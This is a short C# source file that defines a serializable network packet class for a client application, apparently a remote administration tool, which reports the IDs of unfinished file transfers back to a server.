using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using xClient.Core.Networking;

namespace xClient.Core.Packets.ClientPackets
{
    [Serializable]
    class DoVerifyUnfinishedTransferResponse : IPacket
    {
        public int[] TransferIDs { get; set; }
        public bool[] IsFile { get; set;}

        public DoVerifyUnfinishedTransferResponse(int[] transferIDs, bool[] isFile)
        {
            TransferIDs = transferIDs;
            IsFile = isFile;
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}
